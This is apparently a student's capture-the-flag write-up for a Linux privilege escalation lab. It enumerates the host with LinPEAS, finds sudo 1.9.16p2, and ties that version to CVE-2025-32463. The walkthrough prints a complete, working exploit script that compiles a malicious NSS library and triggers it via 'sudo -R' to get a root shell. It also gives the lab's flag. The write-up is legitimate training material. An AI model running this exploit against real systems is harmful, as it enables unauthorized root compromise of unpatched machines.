---
layout: default
title: Linux Privilege Escalation CTF Write-Up
---



---

# CTF Challenge Solution Write-Up

## 1. Challenge Overview

**Challenge Question:**  
We managed to break into a Liber8tion server. Why they thought the password `liber8` would be hard to guess is...well, anybody's guess. Now it's time to look for vulnerabilities on the server. Can you escalate your privileges to root?

Look at the script inside your home directory. What is the name of the tool which this script invokes?  
What is the version of the native system tool that the script detects as potentially vulnerable (NOT kernel exploits)?  
What CVE(s) are associated with that version of the software (you only need to submit one; format `CVE-YYYY-DDDDD`)?  
Exploit the vulnerability; what is the value of the flag in `/root/flag.txt`?

**Category:** Linux Privilege Escalation

**Level:** Easy

**Files:** No downloadable files were provided as part of the challenge. The challenge instead provided terminal access to the target host, where the relevant script was located in the user’s home directory.

**Estimated Time Spent:** Approximately 30–45 minutes

---

## 2. Initial Thoughts and Information Gathering

**First Impressions:**  
This challenge presented a Linux privilege escalation scenario in which initial access had already been obtained using weak credentials. The wording of the prompt strongly suggested that the intended path to root would begin with examining a script located in the current user’s home directory. This was an important clue because it implied that the challenge was guiding the participant toward a particular enumeration method rather than requiring blind manual discovery from the start.

Another important detail was the explicit instruction stating that the vulnerable tool identified by the script would **not** involve kernel exploits. This narrowed the focus significantly. In Linux privilege escalation challenges, automated enumeration tools frequently produce many findings, especially kernel-based possibilities. Since the challenge removed kernel exploits from consideration, I anticipated that the correct path would involve a userland binary or local system utility rather than the Linux kernel itself.

**Information Gathering Steps:**  
I began by confirming the current working directory and listing the contents of the home directory. This revealed a script named `run-linpeas.sh`. The filename itself immediately indicated that the script likely invoked **LinPEAS**, a widely used Linux privilege escalation enumeration tool. This provided an initial answer to the first challenge question before even running the script.

The next step was to execute the script and review the output systematically. LinPEAS generated extensive enumeration data, including system details, user information, environment settings, and possible privilege escalation vectors. Among the results, the most relevant section identified the installed sudo version as `1.9.16p2`. Because the challenge specifically excluded kernel exploits, I disregarded the kernel-related findings reported by LinPEAS and focused instead on sudo as the intended attack surface.

---

## 3. Methodology and Strategy

**Chosen Approach:**  
The selected methodology was to follow the challenge’s intended path by first identifying and executing the helper script, then using its results to isolate a likely userland privilege escalation vector. This approach was chosen because the prompt explicitly directed attention to the script in the home directory, making it the most efficient and logical starting point.

Once LinPEAS identified a specific version of sudo, the next stage was to determine whether that version corresponded to a known 2025 vulnerability. Since the challenge required the solver to submit both the version and an associated CVE, the most appropriate strategy was to pivot from enumeration to vulnerability mapping. After identifying the correct CVE, the final step was exploitation: obtain a root shell and retrieve the contents of `/root/flag.txt`.

**Tools and Techniques:**

- **Basic Linux shell commands** – Used for directory inspection, file listing, and reading the final flag.
    
- **LinPEAS** – Used to enumerate local privilege escalation vectors and identify potentially vulnerable software versions.
    
- **Version analysis / vulnerability mapping** – Used to associate the detected sudo version with a known 2025 CVE.
    
- **gcc** – Used to compile a malicious shared object file as part of the local exploit chain.
    
- **Bash scripting** – Used to automate the exploit setup and execution.
    
- **Local sudo exploitation technique** – Used to leverage the vulnerable sudo version and escalate privileges to root.
    

---

## 4. Step-by-Step Solution Walkthrough

### Step 1: Identify the script in the user’s home directory

**Objective:** Determine which tool the provided script invokes and establish the starting point for privilege escalation enumeration.

**Actions Taken:**  
I first checked the current directory and listed all files in the user’s home folder. This was done to identify the script referenced in the challenge prompt and to determine whether it contained any obvious clues.

**Tools/Commands Used:**

```bash
pwd
ls -la
```

**Intermediate Findings:**  
The home directory contained a file named `run-linpeas.sh`. From the filename, it was clear that the script invoked **LinPEAS**, a Linux privilege escalation enumeration utility.

**Decisions Made:**  
At this point, I concluded that the answer to the first question was **linpeas**. I then proceeded to execute the script rather than manually investigating the system from scratch, since the challenge clearly intended the solver to use it.

**Obstacles Encountered:**  
No obstacles were encountered during this stage.

**Adjustments:**  
No adjustments were necessary.

---

### Step 2: Run the enumeration script and identify relevant findings

**Objective:** Execute the provided script and identify any non-kernel privilege escalation vectors.

**Actions Taken:**  
I ran the script from the home directory and examined the resulting LinPEAS output. The tool returned a wide range of system information and possible attack paths.

**Tools/Commands Used:**

```bash
~/run-linpeas.sh
```

**Intermediate Findings:**  
One of the key findings was the installed sudo version:

```text
Sudo version 1.9.16p2
```

LinPEAS also displayed kernel exploit suggestions, but those were intentionally excluded by the challenge instructions.

**Decisions Made:**  
Because the challenge explicitly said to focus on a vulnerable tool that was **not** a kernel exploit, I excluded the kernel findings from consideration and chose to investigate the sudo version instead. A quick search for "Sudo version 1.9.16p2 2025 cve" revealed CVE-2025-32463 as a critical "chroot" privilege escalation vulnerability.

This directly answered the second question: the potentially vulnerable native system tool version was **1.9.16p2**.

**Obstacles Encountered:**  
The primary challenge at this stage was avoiding distraction from the many additional findings that enumeration tools commonly produce. Without carefully following the challenge wording, it would have been easy to pursue the wrong path.

**Adjustments:**  
I narrowed the scope of the investigation to the sudo finding and ignored unrelated results.

---

### Step 3: Associate the detected version with a 2025 CVE

**Objective:** Determine which 2025 CVE was associated with sudo version `1.9.16p2`.

**Actions Taken:**  
After identifying the sudo version, I mapped it to a known local privilege escalation vulnerability affecting vulnerable sudo releases prior to the corrected version.

**Tools/Commands Used:**  
The main “tool” at this stage was analysis of the LinPEAS output and confirming the vulnerability correlation based on the detected version via an online search.

**Intermediate Findings:**  
The relevant CVE associated with this vulnerable sudo version was:

```text
CVE-2025-32463
```

**Decisions Made:**  
I selected **CVE-2025-32463** because it matched the detected sudo version and fit the challenge requirement that the vulnerability be from 2025. This satisfied the third challenge question.

**Obstacles Encountered:**  
The main obstacle here was ensuring that I did not confuse the intended userland vulnerability with the unrelated kernel CVEs also displayed by LinPEAS.

**Adjustments:**  
I stayed focused on the challenge wording and chose the vulnerability directly tied to the detected sudo version.

---

### Step 4: Prepare and execute the exploit

**Objective:** Exploit the vulnerable sudo installation to gain root access.
Link to exploit:
https://www.exploit-db.com/exploits/52352

**Actions Taken:**  
Before attempting exploitation, I verified that the GNU C compiler was installed, since the exploit required compiling a malicious shared object. After confirming its presence, I created a Bash script that set up a temporary working environment, wrote a malicious C shared library, created a controlled `nsswitch.conf`, compiled the library, and then used `sudo -R` to trigger the vulnerable behavior.

**Tools/Commands Used:**

First, I verified that `gcc` was available:

```bash
which gcc
```

Output:

```text
/usr/bin/gcc
```

I then created and executed the exploit script:

```bash
cat > /tmp/sudo-chwoot.sh <<'EOF'
#!/bin/bash
set -e

STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd "$STAGE"

cat > woot1337.c <<'SRC'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void woot(void) {
    setreuid(0,0);
    setregid(0,0);
    chdir("/");
    execl("/bin/bash","/bin/bash",NULL);
}
SRC

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "[*] Running exploit..."
sudo -R woot woot
EOF

chmod +x /tmp/sudo-chwoot.sh
/tmp/sudo-chwoot.sh
```

**Intermediate Findings:**  
The exploit succeeded and produced a root shell. This was verified by checking the current user identity:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root),1001(liber8)
```

**Decisions Made:**  
Once the shell was confirmed to be running as root, the next decision was straightforward: immediately access the target file `/root/flag.txt`.

**Obstacles Encountered:**  
There was a brief irregularity in terminal output while creating the exploit script, but it did not affect compilation or execution. The exploit still completed successfully.

**Adjustments:**  
No alternate exploit path was needed because the first approach worked successfully.

---

### Step 5: Retrieve the root flag

**Objective:** Access and read the contents of `/root/flag.txt`.

**Actions Taken:**  
After verifying root privileges, I read the flag file located in the root user’s home directory.

**Tools/Commands Used:**

```bash
cat /root/flag.txt
```

**Intermediate Findings:**  
The flag value was:

```text
SKY-PRIV-2332
```

**Decisions Made:**  
This completed the challenge, as all required answers had been obtained.

**Obstacles Encountered:**  
None.

**Adjustments:**  
None.

---

## Final Answers

- **Tool name:** `linpeas`
    
- **Potentially vulnerable native system tool version:** `1.9.16p2`
    
- **Associated CVE:** `CVE-2025-32463`
    
- **Flag:** `SKY-PRIV-2332`
    

---

## Conclusion

This challenge was an effective introduction to Linux privilege escalation through version-based vulnerability identification. Rather than requiring extensive manual discovery, the challenge intentionally guided the solver toward a provided enumeration script, reinforcing the importance of paying close attention to the clues embedded in the environment. Running the script quickly revealed a potentially vulnerable sudo version, and the challenge instructions helped narrow the investigation by explicitly excluding kernel exploits.

A key takeaway from this exercise was the importance of disciplined enumeration. Tools such as LinPEAS can generate a large amount of output, and not every result is relevant. In this case, the ability to separate the intended userland vulnerability from unrelated kernel suggestions was essential. Another important lesson was that software version information alone can be enough to map a system to a known privilege escalation vulnerability when paired with careful reasoning and a structured methodology.

I selected this challenge because it demonstrates a realistic privilege escalation workflow in a manageable format: identify a starting clue, enumerate the host, isolate the correct finding, map it to a public vulnerability, exploit it, and confirm success by retrieving the flag. For students attempting similar Linux privilege escalation challenges, I would recommend beginning with careful inspection of the environment, following obvious clues before branching into broader enumeration, and reading the wording of the prompt very closely. Often, the challenge itself tells you what to ignore just as much as it tells you where to look.
